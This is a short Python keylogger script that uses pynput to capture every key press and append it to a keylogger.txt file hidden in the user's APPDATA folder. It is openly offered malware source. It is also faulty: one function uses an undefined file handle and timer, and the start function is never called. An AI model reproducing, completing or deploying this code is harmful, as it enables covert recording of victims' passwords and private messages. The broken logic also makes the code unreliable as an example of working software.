#!/usr/bin/python
import pynput.keyboard
import os

keys = ""
path = os.environ["appdata"] + "\keylogger.txt"

def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		elif key == key.enter:
			keys = keys + ""
		elif key == key.right:
			keys = keys + ""
		elif key == key.left:
			keys = keys + ""
		elif key == key.down:
                        keys = keys + ""
		elif key == key.up:
			keys = keys + ""
		else:
			keys = keys + " " + str(key) + " "


def Pout():
	global keys
	fin.write(keys)
	keys = ""
	timer.start()

def Start():
	global path
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		with open(path, "a") as fin:
			Pout()
			keyboard_listener.join()
